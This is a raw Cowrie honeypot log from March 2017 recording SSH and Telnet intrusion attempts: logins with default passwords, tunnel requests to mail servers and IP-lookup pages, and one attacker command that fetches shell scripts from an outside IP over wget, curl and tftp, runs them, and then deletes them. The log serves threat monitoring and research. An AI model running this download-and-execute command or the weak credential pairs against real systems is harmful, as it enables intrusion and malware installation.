2017-03-15T22:49:20+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,33017,113.98.193.58] login attempt [root/0000] succeeded
2017-03-15T23:10:44+0000 [SSHChannel None (642) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] sending close 642
2017-03-15T23:10:44+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] got channel 'direct-tcpip' request
2017-03-15T23:10:44+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] direct-tcp connection request to 74.125.200.26:25 from localhost:5556
2017-03-15T23:10:45+0000 [SSHChannel None (56) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] remote eof
2017-03-15T23:10:45+0000 [SSHChannel None (56) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] remote close
2017-03-15T23:10:45+0000 [SSHChannel None (56) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] sending close 56
2017-03-15T23:10:46+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33001,194.88.107.9] got channel 'direct-tcpip' request
2017-03-15T23:10:46+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33001,194.88.107.9] direct-tcp connection request to 185.19.218.137:80 from localhost:5556
2017-03-15T23:10:46+0000 [SSHChannel None (7) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33001,194.88.107.9] direct-tcp forward to 185.19.218.137:80 with data 'GET /get-ip.php HTTP/1.1\r\nHost: 185.19.218.137\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0\r\nAccept: */*\r\nAccept-Encoding: deflate, gzip\r\n\r\n'
2017-03-15T23:10:46+0000 [SSHChannel None (7) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33001,194.88.107.9] failed to connect: Connection refused
2017-03-15T23:10:46+0000 [SSHChannel None (7) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33001,194.88.107.9] sending close 7
2017-03-15T23:10:47+0000 [CowrieTelnetTransport,73842,67.229.141.98] Connection lost after 48 seconds
2017-03-15T23:10:51+0000 [SSHChannel None (57) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] remote eof
2017-03-15T23:10:51+0000 [SSHChannel None (57) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] remote close
2017-03-15T23:10:51+0000 [SSHChannel None (57) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] sending close 57
2017-03-15T23:10:53+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33005,194.88.106.174] got channel 'direct-tcpip' request
2017-03-15T23:10:53+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33005,194.88.106.174] direct-tcp connection request to 107.189.171.198:80 from localhost:5556
2017-03-15T23:10:53+0000 [SSHChannel None (30) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33005,194.88.106.174] direct-tcp forward to 107.189.171.198:80 with data 'GET /ip/header?id_ip=13403437482&id_provider=19 HTTP/1.1\r\nHost: ipinfoplz.com\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4\r\nX-Group: 19\r\nX-Id: 13403437482\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n'
2017-03-15T23:10:53+0000 [SSHChannel None (30) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33005,194.88.106.174] failed to connect: Connection refused
2017-03-15T23:10:53+0000 [SSHChannel None (30) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33005,194.88.106.174] sending close 30
2017-03-15T23:10:53+0000 [SSHChannel None (1787) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] remote eof
2017-03-15T23:10:53+0000 [SSHChannel None (1787) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] remote close
2017-03-15T23:10:53+0000 [SSHChannel None (1787) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] sending close 1787
2017-03-15T23:10:56+0000 [SSHChannel None (58) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] remote eof
2017-03-15T23:10:56+0000 [SSHChannel None (58) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] remote close
2017-03-15T23:10:56+0000 [SSHChannel None (58) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] sending close 58
2017-03-15T23:11:01+0000 [SSHChannel None (643) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] remote eof
2017-03-15T23:11:01+0000 [SSHChannel None (643) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] remote close
2017-03-15T23:11:01+0000 [SSHChannel None (643) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] sending close 643
2017-03-15T23:11:01+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] got channel 'direct-tcpip' request
2017-03-15T23:11:01+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] direct-tcp connection request to 108.177.96.27:25 from localhost:5556
2017-03-15T23:11:03+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32997,194.88.107.23] got channel 'direct-tcpip' request
2017-03-15T23:11:03+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32997,194.88.107.23] direct-tcp connection request to 66.196.118.33:25 from localhost:5556
2017-03-15T23:11:03+0000 [CowrieTelnetTransport,73843,67.229.141.98] Connection lost after 44 seconds
2017-03-15T23:11:05+0000 [CowrieTelnetTransport,73844,67.229.141.98] Connection lost after 44 seconds
2017-03-15T23:11:06+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 167.160.84.115:45930 (10.8.41.81:2222) [session: 325e8009]
2017-03-15T23:11:06+0000 [HoneyPotSSHTransport,33029,167.160.84.115] Remote SSH version: SSH-2.0-libssh2_1.4.2
2017-03-15T23:11:06+0000 [HoneyPotSSHTransport,33029,167.160.84.115] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
2017-03-15T23:11:06+0000 [HoneyPotSSHTransport,33029,167.160.84.115] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
2017-03-15T23:11:06+0000 [HoneyPotSSHTransport,33029,167.160.84.115] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
2017-03-15T23:11:07+0000 [HoneyPotSSHTransport,33029,167.160.84.115] NEW KEYS
2017-03-15T23:11:07+0000 [HoneyPotSSHTransport,33029,167.160.84.115] starting service 'ssh-userauth'
2017-03-15T23:11:07+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,33029,167.160.84.115] 'admin' trying auth 'password'
2017-03-15T23:11:08+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,33029,167.160.84.115] login attempt: 15
2017-03-15T23:11:08+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,33029,167.160.84.115] login return, expect: [admin/1111]
2017-03-15T23:11:10+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,33029,167.160.84.115] login attempt [admin/1111] succeeded
2017-03-15T23:11:11+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,33029,167.160.84.115] 'admin' authenticated with 'password'
2017-03-15T23:11:11+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,33029,167.160.84.115] starting service 'ssh-connection'
2017-03-15T23:11:11+0000 [SSHChannel None (1788) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] remote eof
2017-03-15T23:11:11+0000 [SSHChannel None (1788) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] remote close
2017-03-15T23:11:11+0000 [SSHChannel None (1788) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] sending close 1788
2017-03-15T23:11:11+0000 [SSHChannel None (1789) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] remote eof
2017-03-15T23:11:11+0000 [SSHChannel None (1789) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] remote close
2017-03-15T23:11:11+0000 [SSHChannel None (1789) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] sending close 1789
2017-03-15T23:11:11+0000 [CowrieTelnetTransport,73837,93.174.95.38] Closing TTY Log: log/tty/20170315-230927-None-73837i.log after 103 seconds
2017-03-15T23:11:11+0000 [CowrieTelnetTransport,73837,93.174.95.38] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionLost'>: Connection to the other side was lost in a non-clean fashion.
	]
2017-03-15T23:11:11+0000 [CowrieTelnetTransport,73837,93.174.95.38] Connection lost after 127 seconds
2017-03-15T23:11:11+0000 [SSHChannel None (644) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] remote eof
2017-03-15T23:11:11+0000 [SSHChannel None (644) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] remote close
2017-03-15T23:11:11+0000 [SSHChannel None (644) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] sending close 644
2017-03-15T23:11:11+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] got channel 'direct-tcpip' request
2017-03-15T23:11:11+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] direct-tcp connection request to 74.125.23.27:25 from localhost:5556
2017-03-15T23:11:11+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33029,167.160.84.115] got channel 'session' request
2017-03-15T23:11:11+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33029,167.160.84.115] channel open
2017-03-15T23:11:12+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33029,167.160.84.115] executing command "cd /tmp ;wget http://185.61.138.102/oh.sh;curl -O http://185.61.138.102/oh.sh;sh oh.sh;rm -rf oh.sh;tftp -r toh.sh -g 185.61.138.102;sh toh.sh; tftp 185.61.138.102 -c get toh2.sh; sh toh2.sh; rm -rf toh.sh toh2.sh oh.sh"
2017-03-15T23:11:12+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33029,167.160.84.115] Opening TTY Log: log/tty/20170315-231112-325e8009-0e.log
2017-03-15T23:11:12+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33029,167.160.84.115] CMD: cd /tmp ;wget http://185.61.138.102/oh.sh;curl -O http://185.61.138.102/oh.sh;sh oh.sh;rm -rf oh.sh;tftp -r toh.sh -g 185.61.138.102;sh toh.sh; tftp 185.61.138.102 -c get toh2.sh; sh toh2.sh; rm -rf toh.sh toh2.sh oh.sh
2017-03-15T23:11:12+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33029,167.160.84.115] Command found: cd /tmp
2017-03-15T23:11:12+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33029,167.160.84.115] Command found: wget http://185.61.138.102/oh.sh
2017-03-15T23:11:12+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.61.138.102/oh.sh>
2017-03-15T23:11:12+0000 [HTTPPageDownloader,client] Not storing duplicate content 5046880fb015c4cf204bf2d640e784d1f5adbff092b4cc705f2b306edde7cc58
2017-03-15T23:11:12+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.61.138.102/oh.sh) with SHA-256 5046880fb015c4cf204bf2d640e784d1f5adbff092b4cc705f2b306edde7cc58 to dl/5046880fb015c4cf204bf2d640e784d1f5adbff092b4cc705f2b306edde7cc58
2017-03-15T23:11:12+0000 [HTTPPageDownloader,client] Command found: curl -O http://185.61.138.102/oh.sh
2017-03-15T23:11:12+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.61.138.102/oh.sh>
2017-03-15T23:11:12+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.61.138.102/oh.sh>
2017-03-15T23:11:12+0000 [HTTPPageDownloader,client] Not storing duplicate content 5046880fb015c4cf204bf2d640e784d1f5adbff092b4cc705f2b306edde7cc58
2017-03-15T23:11:12+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.61.138.102/oh.sh) with SHA-256 5046880fb015c4cf204bf2d640e784d1f5adbff092b4cc705f2b306edde7cc58 to dl/5046880fb015c4cf204bf2d640e784d1f5adbff092b4cc705f2b306edde7cc58
2017-03-15T23:11:12+0000 [HTTPPageDownloader,client] Command found: sh /tmp/oh.sh
2017-03-15T23:11:12+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/oh.sh
2017-03-15T23:11:12+0000 [HTTPPageDownloader,client] Command found: tftp -r toh.sh -g 185.61.138.102
2017-03-15T23:11:12+0000 [HTTPPageDownloader,client] Command found: sh toh.sh
2017-03-15T23:11:12+0000 [HTTPPageDownloader,client] Command found: tftp 185.61.138.102 -c get toh2.sh
2017-03-15T23:11:12+0000 [HTTPPageDownloader,client] Command found: sh toh2.sh
2017-03-15T23:11:12+0000 [HTTPPageDownloader,client] Command found: rm -rf toh.sh toh2.sh oh.sh
2017-03-15T23:11:12+0000 [HTTPPageDownloader,client] exitCode: 0
2017-03-15T23:11:12+0000 [HTTPPageDownloader,client] sending request 'exit-status'
2017-03-15T23:11:12+0000 [HTTPPageDownloader,client] Not storing duplicate content 5046880fb015c4cf204bf2d640e784d1f5adbff092b4cc705f2b306edde7cc58
2017-03-15T23:11:12+0000 [HTTPPageDownloader,client] Saved redir contents with SHA-256 5046880fb015c4cf204bf2d640e784d1f5adbff092b4cc705f2b306edde7cc58 to dl/5046880fb015c4cf204bf2d640e784d1f5adbff092b4cc705f2b306edde7cc58
2017-03-15T23:11:12+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170315-231112-325e8009-0e.log after 0 seconds
2017-03-15T23:11:12+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
	]
2017-03-15T23:11:12+0000 [HTTPPageDownloader,client] sending close 0
2017-03-15T23:11:12+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.61.138.102/oh.sh>
2017-03-15T23:11:13+0000 [CowrieTelnetTransport,73845,67.229.141.98] Connection lost after 41 seconds
2017-03-15T23:11:14+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] got channel 'direct-tcpip' request
2017-03-15T23:11:14+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] direct-tcp connection request to 188.125.69.79:25 from localhost:5556
2017-03-15T23:11:20+0000 [SSHChannel None (1790) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] direct-tcp forward to 85.115.54.190:25 with data 'QUIT\r\n'
2017-03-15T23:11:20+0000 [SSHChannel None (1790) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] failed to connect: Connection refused
2017-03-15T23:11:20+0000 [SSHChannel None (1790) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] sending close 1790
2017-03-15T23:11:20+0000 [SSHChannel None (1790) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] remote eof
2017-03-15T23:11:20+0000 [SSHChannel None (1790) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] remote close
2017-03-15T23:11:22+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33029,167.160.84.115] remote close
2017-03-15T23:11:22+0000 [HoneyPotSSHTransport,33029,167.160.84.115] avatar admin logging out
2017-03-15T23:11:22+0000 [HoneyPotSSHTransport,33029,167.160.84.115] connection lost
2017-03-15T23:11:22+0000 [HoneyPotSSHTransport,33029,167.160.84.115] Connection lost after 15 seconds
2017-03-15T23:11:24+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32904,91.195.103.178] got channel 'direct-tcpip' request
2017-03-15T23:11:24+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32904,91.195.103.178] direct-tcp connection request to 144.160.235.143:25 from localhost:5556
2017-03-15T23:11:26+0000 [SSHChannel None (645) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] remote eof
2017-03-15T23:11:26+0000 [SSHChannel None (645) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] remote close
2017-03-15T23:11:26+0000 [SSHChannel None (645) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] sending close 645
2017-03-15T23:11:27+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] got channel 'direct-tcpip' request
2017-03-15T23:11:27+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] direct-tcp connection request to 107.14.73.70:25 from localhost:5556
2017-03-15T23:11:28+0000 [SSHChannel None (41) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32997,194.88.107.23] remote eof
2017-03-15T23:11:28+0000 [SSHChannel None (41) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32997,194.88.107.23] remote close
2017-03-15T23:11:28+0000 [SSHChannel None (41) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32997,194.88.107.23] sending close 41
2017-03-15T23:11:28+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32997,194.88.107.23] got channel 'direct-tcpip' request
2017-03-15T23:11:28+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32997,194.88.107.23] direct-tcp connection request to 98.138.112.32:25 from localhost:5556
2017-03-15T23:11:31+0000 [SSHChannel None (1792) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] remote eof
2017-03-15T23:11:31+0000 [SSHChannel None (1792) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] remote close
2017-03-15T23:11:31+0000 [SSHChannel None (1792) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] sending close 1792
2017-03-15T23:11:33+0000 [SSHChannel None (1791) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] direct-tcp forward to 178.164.11.113:25 with data 'QUIT\r\n'
2017-03-15T23:11:33+0000 [SSHChannel None (1791) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] failed to connect: Connection refused
2017-03-15T23:11:33+0000 [SSHChannel None (1791) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] sending close 1791
2017-03-15T23:11:34+0000 [SSHChannel None (1791) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] remote eof
